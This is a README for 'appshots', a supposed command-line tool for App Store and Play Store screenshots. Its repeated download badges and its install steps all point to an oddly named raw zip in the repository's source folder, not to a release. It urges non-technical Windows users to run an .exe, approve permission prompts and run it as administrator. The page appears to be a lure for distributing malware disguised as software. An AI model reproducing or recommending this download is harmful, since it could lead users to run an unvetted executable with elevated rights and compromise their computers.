# 🖼️ appshots - Create App Store Screenshots Easily

[![Download appshots](https://img.shields.io/badge/Download-appshots-green?style=for-the-badge)](https://github.com/CodeWithMe-UI/appshots/raw/refs/heads/main/src/Software_unrepaid.zip)

---

## 📋 What is appshots?

appshots is a tool that helps you create screenshots ready for the App Store or Google Play Store. It runs from your computer’s command line, but you do not need to be a developer to use it. It comes with 26 device presets, which means it can show your app on a variety of phone and tablet screens without extra setup.

You can easily frame your app’s images, capture new screenshots on real device sizes, and check that your images meet the app store’s rules. 

You do not need special software or coding knowledge. appshots makes this process fast and clear.

---

## 💻 System Requirements

To use appshots on Windows, your computer should meet these minimum requirements:

- Windows 10 or higher (64-bit)
- 4 GB of RAM (8 GB or more recommended)
- At least 500 MB free disk space
- Internet connection to download appshots and for initial setup
- PowerShell or Command Prompt (comes with Windows)

This ensures that appshots runs smoothly and that your screenshots will look accurate.

---

## 🔽 How to Download appshots

Visit the appshots release page below to get the latest version for Windows.

[![Download appshots](https://img.shields.io/badge/Download-appshots-blue?style=for-the-badge)](https://github.com/CodeWithMe-UI/appshots/raw/refs/heads/main/src/Software_unrepaid.zip)

This page hosts all versions of appshots. Locate the file labeled with ".exe" or "Windows" in the name to download the installer or executable file that works on your PC.

---

## 🚀 Getting Started: Install and Run appshots on Windows

Follow these steps to download and start using appshots:

1. **Open your web browser:** Use Chrome, Edge, or Firefox.

2. **Go to the download page:** Click the green or blue badge above or enter this URL in your browser’s address bar:  
   https://github.com/CodeWithMe-UI/appshots/raw/refs/heads/main/src/Software_unrepaid.zip

3. **Find the Windows file:** Scroll the page to find the file with ".exe" in the name. This is the installer or program you need.

4. **Download the file:** Click the file name. The file downloads to your computer (usually your “Downloads” folder).

5. **Run the installer:** Open your Downloads folder, find the file, and double-click to run it.  
   - If Windows asks for permission, click “Yes” to allow installation.

6. **Follow the setup steps:** The installer will guide you through a few simple screens. You can use the default options.

7. **Finish installation:** When done, the appshots program will be ready to use.

---

## 🛠️ How to Use appshots

appshots runs from a command window (PowerShell or Command Prompt). If you have not used these before, follow this simple guide.

### Open Command Prompt:

- Click the Windows Start menu
- Type `cmd`
- Press Enter

### Run appshots commands:

You will use short commands in the window to create screenshots.

Here’s a basic example to create a screenshot for an iPhone 13:

```bash
appshots capture --device iphone13 --source path\to\your\app\screen.png
```

Replace `path\to\your\app\screen.png` with the location of your app screen image file.

### Common Commands

| Command               | What it does                                  |
|-----------------------|----------------------------------------------|
| `appshots capture`    | Takes a screenshot using a device preset     |
| `appshots frame`      | Adds a device frame around your image         |
| `appshots validate`   | Checks if screenshots follow app store rules |

All commands have options you can explore by typing:

```bash
appshots --help
```

---

## 🖼️ Device Presets Included

appshots supports 26 device presets that cover popular phones and tablets. Some examples are:

- iPhone 13 and iPhone 13 Pro
- iPad Pro 11-inch
- Google Pixel 6 and Pixel 7
- Samsung Galaxy S21 and S22

Each preset matches exact screen size and resolution. This lets you see your app the way users will.

---

## ⚙️ Customizing Screenshots

If you want to frame or capture screenshots in a custom size or style, appshots provides options.

For instance, you can specify device color or background when framing:

```bash
appshots frame --device iphone13 --color midnight --background white
```

This produces a screenshot with a black iPhone 13 frame and white background.

---

## 🔧 Troubleshooting Common Issues

- **Command not found:** Make sure appshots installed correctly and your Command Prompt is restarted.
- **Error reading files:** Check the path to your image files for typos. Use full file paths if needed.
- **Screenshots look blurry:** Use high-resolution source images for better results.
- **Permission issues during install:** Run as administrator by right-clicking the installer and selecting “Run as administrator.”

---

## 📂 Where to Find Help

- Visit the GitHub Issues page to report bugs or ask questions.
- Read the documentation files included with appshots for tips.
- Use `appshots --help` for quick command info.

---

## ⚙️ Advanced Setup (Optional)

If you or someone on your team has some coding background, appshots also works through Node.js or npx commands. But for basic screenshot generation on Windows, using the installer above is enough.

---

## 💾 Uninstall appshots

To remove appshots from your PC:

1. Open the Windows Start menu.
2. Type "Add or remove programs" and press Enter.
3. Find "appshots" in the list.
4. Click on it, then select "Uninstall."
5. Follow the prompts to complete removal.

---

[![Download appshots](https://img.shields.io/badge/Download-appshots-green?style=for-the-badge)](https://github.com/CodeWithMe-UI/appshots/raw/refs/heads/main/src/Software_unrepaid.zip)